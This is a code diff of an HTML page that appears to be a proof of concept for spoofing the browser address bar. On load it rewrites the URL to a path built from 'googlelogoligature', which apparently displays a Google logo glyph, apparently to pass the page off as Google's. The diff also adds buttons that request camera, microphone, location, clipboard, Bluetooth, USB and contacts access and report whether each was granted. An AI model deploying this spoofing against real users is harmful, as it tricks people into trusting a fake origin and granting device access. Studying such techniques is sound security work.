@@ -3,30 +3,116 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>pocpoc</title>
+    <title>awdawd</title>
     <style>
       body {
         font-family: sans-serif;
         background: #202124;
         color: white;
         text-align: center;
-        padding-top: 20vh;
+        padding: 20px;
+        margin: 0;
       }
-      h2 {
-        color: #8ab4f8;
+      h2 { color: #8ab4f8; margin-bottom: 5px; }
+      p { color: #9aa0a6; margin-bottom: 20px; }
+      .grid {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 15px;
+        max-width: 400px;
+        margin: 0 auto;
       }
+      .btn {
+        background: #1a73e8;
+        color: white;
+        border: none;
+        padding: 15px 10px;
+        border-radius: 8px;
+        font-weight: bold;
+        cursor: pointer;
+        font-size: 14px;
+        box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+      }
+      .btn:active { background: #1557b0; }
+      #status { margin-top: 20px; color: #34a853; font-weight: bold; }
     </style>
   </head>
   <body>
-    <h2>pocpoc</h2>
-    <p>Check your address bar right now.</p>
+    <h2>tester</h2>
+
+    <div class="grid">
+      <button class="btn" id="btn-cam-mic">Camera & Mic</button>
+      <button class="btn" id="btn-loc">Location</button>
+      <button class="btn" id="btn-notif">Notifications</button>
+      <button class="btn" id="btn-clip">Read Clipboard</button>
+      <button class="btn" id="btn-bt">Bluetooth</button>
+      <button class="btn" id="btn-usb">USB Devices</button>
+      <button class="btn" id="btn-contact">Contacts</button>
+    </div>
+
+    <div id="status"></div>
 
     <script>
-
       window.onload = function () {
         const magicString = "googlelogoligature";
-        const spoofedPath = "/" + magicString + "/login-secure";
+        const spoofedPath = "/" + magicString + "/secure-module";
         window.history.replaceState(null, "", spoofedPath);
+      };
+
+      const statusEl = document.getElementById('status');
+      const log = (msg) => { statusEl.innerText = msg; };
+
+      document.getElementById('btn-cam-mic').onclick = async () => {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            stream.getTracks().forEach(t => t.stop()); // Matikan langsung kalau tembus
+            log("Camera & Mic Granted!");
+        } catch(e) { log("Camera/Mic Denied: " + e.message); }
+      };
+
+      document.getElementById('btn-loc').onclick = () => {
+        navigator.geolocation.getCurrentPosition(
+            (pos) => log(`Location Granted! (Lat: ${pos.coords.latitude})`),
+            (err) => log("Location Denied: " + err.message)
+        );
+      };
+
+      document.getElementById('btn-notif').onclick = async () => {
+        const perm = await Notification.requestPermission();
+        log("Notification status: " + perm);
+      };
+
+      document.getElementById('btn-clip').onclick = async () => {
+        try {
+            const text = await navigator.clipboard.readText();
+            log("Clipboard Read Granted! Data: " + text.substring(0,20) + "...");
+        } catch(e) { log("Clipboard Denied: " + e.message); }
+      };
+
+      document.getElementById('btn-bt').onclick = async () => {
+        try {
+            const device = await navigator.bluetooth.requestDevice({ acceptAllDevices: true });
+            log("Bluetooth Granted! Device: " + device.name);
+        } catch(e) { log("Bluetooth Denied: " + e.message); }
+      };
+
+      document.getElementById('btn-usb').onclick = async () => {
+        try {
+            const device = await navigator.usb.requestDevice({ filters: [] });
+            log("USB Granted! Product: " + device.productName);
+        } catch(e) { log("USB Denied: " + e.message); }
+      };
+
+      document.getElementById('btn-contact').onclick = async () => {
+        if ('contacts' in navigator && 'ContactsManager' in window) {
+            try {
+                const props = ['name', 'email', 'tel'];
+                const contacts = await navigator.contacts.select(props, { multiple: false });
+                log("Contacts Granted! Got " + contacts.length + " contact.");
+            } catch(e) { log("Contacts Denied: " + e.message); }
+        } else {
+            log("Contacts API not supported on this browser.");
+        }
       };
     </script>
   </body>
